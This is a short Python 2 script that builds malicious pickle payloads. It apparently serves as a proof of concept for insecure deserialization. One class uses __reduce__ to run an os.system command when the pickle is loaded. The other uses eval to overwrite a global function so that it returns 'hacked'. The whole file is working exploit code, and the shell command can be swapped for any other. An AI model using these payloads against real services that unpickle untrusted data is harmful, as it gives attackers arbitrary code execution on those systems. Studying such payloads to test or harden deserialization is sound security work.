#!/usr/bin/env python2

import cPickle
import sys, os

class SerializedPickleOSCommand(object):
    def __reduce__(self):
        return(os.system,("ls -la",))

class SerializedPickleEval(object):
    def __reduce__(self):
        return(__builtins__.eval,('eval(compile("""global finished\ndef finished():\n    return \'hacked\'""", \'<stdin>\', \'exec\'))',))

if len(sys.argv) < 2:
    print("Usage: ./generate_pickle.py #")
    print("#1: ls")
    print("#2: Overwrite finished function")
    exit()

if sys.argv[1] == "1":
    print(cPickle.dumps(SerializedPickleOSCommand()))
elif sys.argv[1] == "2":
    print(cPickle.dumps(SerializedPickleEval()))